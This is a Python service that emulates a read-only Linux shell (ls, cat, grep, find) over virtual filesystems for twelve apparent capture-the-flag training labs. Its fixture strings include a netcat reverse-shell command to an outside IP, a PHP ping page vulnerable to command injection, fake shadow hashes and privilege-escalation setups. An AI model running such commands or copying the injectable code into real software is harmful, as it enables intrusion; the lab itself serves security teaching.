from __future__ import annotations

from dataclasses import dataclass
from fnmatch import fnmatch
import posixpath
import re
import shlex


class ChallengeLabServiceError(Exception):
    """Base exception for challenge lab failures."""


class ChallengeLabUnavailableError(ChallengeLabServiceError):
    """Raised when no lab is configured for a challenge."""


@dataclass(frozen=True, slots=True)
class ChallengeLabCommandResult:
    output: str
    cwd: str
    exit_code: int


class _VirtualFilesystem:
    def __init__(self, files: dict[str, str]) -> None:
        self._files = {self.normalize_path(path): content for path, content in files.items()}
        self._directories = self._derive_directories(self._files)

    @staticmethod
    def normalize_path(path: str) -> str:
        normalized = posixpath.normpath(path.strip() or "/")
        if not normalized.startswith("/"):
            normalized = f"/{normalized}"
        return normalized or "/"

    def resolve(self, cwd: str, target: str) -> str:
        if target.startswith("/"):
            return self.normalize_path(target)
        return self.normalize_path(posixpath.join(cwd, target))

    def exists(self, path: str) -> bool:
        normalized = self.normalize_path(path)
        return normalized in self._files or normalized in self._directories

    def is_file(self, path: str) -> bool:
        return self.normalize_path(path) in self._files

    def is_dir(self, path: str) -> bool:
        return self.normalize_path(path) in self._directories

    def read_file(self, path: str) -> str:
        return self._files[self.normalize_path(path)]

    def list_dir(self, path: str, show_all: bool) -> list[str]:
        normalized = self.normalize_path(path)
        prefix = "/" if normalized == "/" else f"{normalized}/"
        children: set[str] = set()

        for candidate in self._directories | set(self._files.keys()):
            if candidate == normalized:
                continue
            if not candidate.startswith(prefix):
                continue
            remainder = candidate[len(prefix) :]
            if not remainder:
                continue
            children.add(remainder.split("/", maxsplit=1)[0])

        visible = sorted(name for name in children if show_all or not name.startswith("."))
        if show_all:
            return [".", "..", *visible]
        return visible

    def iter_files_under(self, path: str, recursive: bool) -> list[str]:
        normalized = self.normalize_path(path)
        if self.is_file(normalized):
            return [normalized]
        if not self.is_dir(normalized):
            return []

        prefix = "/" if normalized == "/" else f"{normalized}/"
        files = []
        for file_path in sorted(self._files):
            if not file_path.startswith(prefix):
                continue
            remainder = file_path[len(prefix) :]
            if not recursive and "/" in remainder:
                continue
            files.append(file_path)
        return files

    def walk(self, path: str) -> list[str]:
        normalized = self.normalize_path(path)
        if not self.exists(normalized):
            return []
        if self.is_file(normalized):
            return [normalized]

        prefix = "/" if normalized == "/" else f"{normalized}/"
        nodes = [normalized]
        for directory in sorted(self._directories):
            if directory == normalized:
                continue
            if directory.startswith(prefix):
                nodes.append(directory)
        for file_path in sorted(self._files):
            if file_path.startswith(prefix):
                nodes.append(file_path)
        return nodes

    @staticmethod
    def _derive_directories(files: dict[str, str]) -> set[str]:
        directories = {"/"}
        for file_path in files:
            parent = posixpath.dirname(file_path)
            while parent:
                directories.add(parent)
                if parent == "/":
                    break
                parent = posixpath.dirname(parent)
        return directories


class ChallengeLabService:
    _M11_FILES: dict[str, str] = {
        "/etc/motd": "Authorized access only.",
        "/etc/nginx/nginx.conf": (
            "user nginx;\n"
            "worker_processes auto;\n"
            "include /etc/nginx/conf.d/site.conf;\n"
        ),
        "/etc/nginx/conf.d/site.conf": (
            "server_name internal-app.local;\n"
            "include /etc/nginx/conf.d/.legacy.conf;\n"
        ),
        "/etc/nginx/conf.d/.legacy.conf": (
            "# Temporary migration include chain\n"
            "include /etc/.config_chain/.indicator.conf;\n"
        ),
        "/etc/.config_chain/.indicator.conf": (
            "indicator_file=/etc/.config_chain/.indicator.txt\n"
            "mode=legacy\n"
        ),
        "/etc/.config_chain/.indicator.txt": "CTF{hidden_in_etc}",
        "/etc/ssh/sshd_config": (
            "PermitRootLogin no\n"
            "PasswordAuthentication no\n"
        ),
    }

    _M12_FILES: dict[str, str] = {
        "/home/user/notes.txt": "I left the flag in /var/lib/secret/flag.txt\n",
        "/var/lib/secret/flag.txt": "CTF{chmod_777_is_bad}\n",
    }
    _M13_FILES: dict[str, str] = {
        "/usr/bin/bash": "ELF binary (suid)\n",
        "/etc/shadow": "root:$6$xyz...:19000:0:99999:7:::\n",
        "/root/flag.txt": "CTF{suid_bash_privesc}\n",
    }
    _M14_FILES: dict[str, str] = {
        "/etc/crontab": "* * * * * root /usr/local/bin/backup.sh *\n",
        "/usr/local/bin/backup.sh": "tar -czf /var/backups/data.tar.gz /data/*\n",
        "/data/flag.txt": "CTF{cron_wildcard_injection}\n",
    }
    _M15_FILES: dict[str, str] = {
        "/etc/shadow": "admin:$1$abc$12345/hashed:19000:0:99999:7:::\n (Hint: MD5 crypt is weak) \n \nCTF{weak_md5_crypt}",
    }
    _M16_FILES: dict[str, str] = {
        "/home/user/.bash_history": "nc -e /bin/bash 10.0.0.5 4444\n",
        "/tmp/notes.txt": "Reverse shell dropped. Flag: CTF{netcat_traditional_e}\n",
    }
    _M17_FILES: dict[str, str] = {
        "/var/www/html/ping.php": "<?php system('ping -c 4 ' . $_GET['ip']); ?>\n",
        "/var/www/html/flag.txt": "CTF{semicolon_command_injection}\n",
    }
    _M18_FILES: dict[str, str] = {
        "/etc/ld.so.preload": "/tmp/hook.so\n",
        "/tmp/notes.txt": "Used LD_PRELOAD to get root. Flag: CTF{ld_preload_privesc}\n",
    }
    _M19_FILES: dict[str, str] = {
        "/proc/version": "Linux version 2.6.22 (gcc version 4.1.2)\n",
        "/home/user/exploit.c": "// Dirty COW exploit\n",
        "/root/flag.txt": "CTF{dirty_cow_cve_2016_5195}\n",
    }
    _M20_FILES: dict[str, str] = {
        "/var/log/auth.log": "Failed password for root from 10.0.0.2 port 22 ssh2\nFailed password for root from 10.0.0.2 port 22 ssh2\nAccepted password for root from 10.0.0.2 port 22 ssh2\n",
        "/root/flag.txt": "CTF{ssh_bruteforce_success}\n",
    }
    _M21_FILES: dict[str, str] = {
        "/proc/sys/kernel/yama/ptrace_scope": "0\n",
        "/home/user/notes.txt": "ptrace_scope is 0, we can inject into processes. Flag: CTF{ptrace_scope_bypass}\n",
    }
    _M22_FILES: dict[str, str] = {
        "/root/nmap_scan.xml": "<nmaprun><host><ports><port protocol='tcp' portid='22'><state state='open'/></port></ports></host></nmaprun>\n",
        "/root/flag.txt": "CTF{nmap_service_enumeration}\n",
    }

    def __init__(self) -> None:
        self._labs: dict[str, _VirtualFilesystem] = {
            "m11-hidden-in-etc": _VirtualFilesystem(self._M11_FILES),
            "m12-permission-denied": _VirtualFilesystem(self._M12_FILES),
            "m13-suid-secrets": _VirtualFilesystem(self._M13_FILES),
            "m14-cron-exploit": _VirtualFilesystem(self._M14_FILES),
            "m15-shadow-hunter": _VirtualFilesystem(self._M15_FILES),
            "m16-reverse-shell-drop": _VirtualFilesystem(self._M16_FILES),
            "m17-bash-injection": _VirtualFilesystem(self._M17_FILES),
            "m18-root-me": _VirtualFilesystem(self._M18_FILES),
            "m19-kernel-panic": _VirtualFilesystem(self._M19_FILES),
            "m20-log-miner": _VirtualFilesystem(self._M20_FILES),
            "m21-zombie-process": _VirtualFilesystem(self._M21_FILES),
            "m22-kali-recon-lab": _VirtualFilesystem(self._M22_FILES),
        }

    def has_lab(self, challenge_slug: str) -> bool:
        return challenge_slug in self._labs

    def execute_command(self, challenge_slug: str, command: str, cwd: str) -> ChallengeLabCommandResult:
        filesystem = self._labs.get(challenge_slug)
        if filesystem is None:
            raise ChallengeLabUnavailableError("Lab unavailable for this challenge.")

        normalized_cwd = filesystem.normalize_path(cwd or "/")
        if not filesystem.is_dir(normalized_cwd):
            normalized_cwd = "/"

        command_text = command.strip()
        if not command_text:
            return ChallengeLabCommandResult(output="", cwd=normalized_cwd, exit_code=0)

        try:
            tokens = shlex.split(command_text)
        except ValueError as exc:
            return ChallengeLabCommandResult(output=f"parse error: {exc}", cwd=normalized_cwd, exit_code=1)

        if not tokens:
            return ChallengeLabCommandResult(output="", cwd=normalized_cwd, exit_code=0)

        name = tokens[0]
        args = tokens[1:]

        if name == "help":
            return ChallengeLabCommandResult(
                output=(
                    "Supported commands: help, pwd, ls, cd, cat, grep, find\n"
                    "Examples:\n"
                    "  ls -la /etc\n"
                    "  grep -R include /etc\n"
                    "  find /etc -name '*.conf'"
                ),
                cwd=normalized_cwd,
                exit_code=0,
            )
        if name == "pwd":
            return ChallengeLabCommandResult(output=normalized_cwd, cwd=normalized_cwd, exit_code=0)
        if name == "cd":
            return self._cmd_cd(filesystem, normalized_cwd, args)
        if name == "ls":
            return self._cmd_ls(filesystem, normalized_cwd, args)
        if name == "cat":
            return self._cmd_cat(filesystem, normalized_cwd, args)
        if name == "grep":
            return self._cmd_grep(filesystem, normalized_cwd, args)
        if name == "find":
            return self._cmd_find(filesystem, normalized_cwd, args)

        return ChallengeLabCommandResult(
            output=f"{name}: command not found",
            cwd=normalized_cwd,
            exit_code=127,
        )

    def _cmd_cd(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        target = "/" if not args else args[0]
        if len(args) > 1:
            return ChallengeLabCommandResult(output="cd: too many arguments", cwd=cwd, exit_code=1)

        destination = filesystem.resolve(cwd, target)
        if not filesystem.exists(destination):
            return ChallengeLabCommandResult(
                output=f"cd: {target}: No such file or directory",
                cwd=cwd,
                exit_code=1,
            )
        if not filesystem.is_dir(destination):
            return ChallengeLabCommandResult(
                output=f"cd: {target}: Not a directory",
                cwd=cwd,
                exit_code=1,
            )
        return ChallengeLabCommandResult(output="", cwd=destination, exit_code=0)

    def _cmd_ls(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        show_all = False
        target: str | None = None

        for arg in args:
            if arg.startswith("-"):
                for flag in arg[1:]:
                    if flag == "a":
                        show_all = True
                    elif flag == "l":
                        # accepted for familiarity; output remains simple listing
                        continue
                    else:
                        return ChallengeLabCommandResult(
                            output=f"ls: invalid option -- '{flag}'",
                            cwd=cwd,
                            exit_code=1,
                        )
                continue

            if target is not None:
                return ChallengeLabCommandResult(
                    output="ls: too many operands",
                    cwd=cwd,
                    exit_code=1,
                )
            target = arg

        path = filesystem.resolve(cwd, target or ".")
        if not filesystem.exists(path):
            return ChallengeLabCommandResult(
                output=f"ls: cannot access '{target or '.'}': No such file or directory",
                cwd=cwd,
                exit_code=1,
            )

        if filesystem.is_file(path):
            return ChallengeLabCommandResult(
                output=posixpath.basename(path),
                cwd=cwd,
                exit_code=0,
            )

        listing = filesystem.list_dir(path, show_all=show_all)
        return ChallengeLabCommandResult(output="\n".join(listing), cwd=cwd, exit_code=0)

    def _cmd_cat(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        if not args:
            return ChallengeLabCommandResult(output="cat: missing file operand", cwd=cwd, exit_code=1)

        chunks: list[str] = []
        for raw_path in args:
            path = filesystem.resolve(cwd, raw_path)
            if not filesystem.exists(path):
                return ChallengeLabCommandResult(
                    output=f"cat: {raw_path}: No such file or directory",
                    cwd=cwd,
                    exit_code=1,
                )
            if filesystem.is_dir(path):
                return ChallengeLabCommandResult(
                    output=f"cat: {raw_path}: Is a directory",
                    cwd=cwd,
                    exit_code=1,
                )

            content = filesystem.read_file(path).rstrip("\n")
            if len(args) > 1:
                chunks.append(f"==> {path} <==")
            chunks.append(content)

        return ChallengeLabCommandResult(output="\n".join(chunks), cwd=cwd, exit_code=0)

    def _cmd_grep(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        recursive = False
        index = 0
        while index < len(args) and args[index].startswith("-"):
            options = args[index][1:]
            for option in options:
                if option in {"r", "R"}:
                    recursive = True
                else:
                    return ChallengeLabCommandResult(
                        output=f"grep: invalid option -- '{option}'",
                        cwd=cwd,
                        exit_code=1,
                    )
            index += 1

        remaining = args[index:]
        if len(remaining) < 2:
            return ChallengeLabCommandResult(
                output="usage: grep [-r|-R] PATTERN PATH",
                cwd=cwd,
                exit_code=1,
            )

        pattern, raw_path = remaining[0], remaining[1]
        path = filesystem.resolve(cwd, raw_path)
        if not filesystem.exists(path):
            return ChallengeLabCommandResult(
                output=f"grep: {raw_path}: No such file or directory",
                cwd=cwd,
                exit_code=1,
            )
        if filesystem.is_dir(path) and not recursive:
            return ChallengeLabCommandResult(
                output=f"grep: {raw_path}: Is a directory",
                cwd=cwd,
                exit_code=1,
            )

        try:
            expression = re.compile(pattern)
        except re.error as exc:
            return ChallengeLabCommandResult(output=f"grep: invalid regex: {exc}", cwd=cwd, exit_code=1)

        matches: list[str] = []
        for file_path in filesystem.iter_files_under(path, recursive=recursive):
            for line_no, line in enumerate(filesystem.read_file(file_path).splitlines(), start=1):
                if expression.search(line):
                    matches.append(f"{file_path}:{line_no}:{line}")

        if not matches:
            return ChallengeLabCommandResult(output="", cwd=cwd, exit_code=1)

        return ChallengeLabCommandResult(output="\n".join(matches), cwd=cwd, exit_code=0)

    def _cmd_find(self, filesystem: _VirtualFilesystem, cwd: str, args: list[str]) -> ChallengeLabCommandResult:
        if not args:
            return ChallengeLabCommandResult(
                output="usage: find PATH [-type f|d] [-name GLOB]",
                cwd=cwd,
                exit_code=1,
            )

        raw_path = args[0]
        query_path = filesystem.resolve(cwd, raw_path)
        if not filesystem.exists(query_path):
            return ChallengeLabCommandResult(
                output=f"find: '{raw_path}': No such file or directory",
                cwd=cwd,
                exit_code=1,
            )

        type_filter: str | None = None
        name_glob: str | None = None
        index = 1
        while index < len(args):
            token = args[index]
            if token == "-type":
                if index + 1 >= len(args):
                    return ChallengeLabCommandResult(output="find: missing argument to '-type'", cwd=cwd, exit_code=1)
                type_filter = args[index + 1]
                if type_filter not in {"f", "d"}:
                    return ChallengeLabCommandResult(
                        output=f"find: unknown argument to -type: {type_filter}",
                        cwd=cwd,
                        exit_code=1,
                    )
                index += 2
                continue

            if token == "-name":
                if index + 1 >= len(args):
                    return ChallengeLabCommandResult(output="find: missing argument to '-name'", cwd=cwd, exit_code=1)
                name_glob = args[index + 1]
                index += 2
                continue

            return ChallengeLabCommandResult(
                output=f"find: unsupported predicate '{token}'",
                cwd=cwd,
                exit_code=1,
            )

        results: list[str] = []
        for candidate in filesystem.walk(query_path):
            if type_filter == "f" and not filesystem.is_file(candidate):
                continue
            if type_filter == "d" and not filesystem.is_dir(candidate):
                continue
            if name_glob and not fnmatch(posixpath.basename(candidate), name_glob):
                continue
            results.append(candidate)

        return ChallengeLabCommandResult(output="\n".join(results), cwd=cwd, exit_code=0)
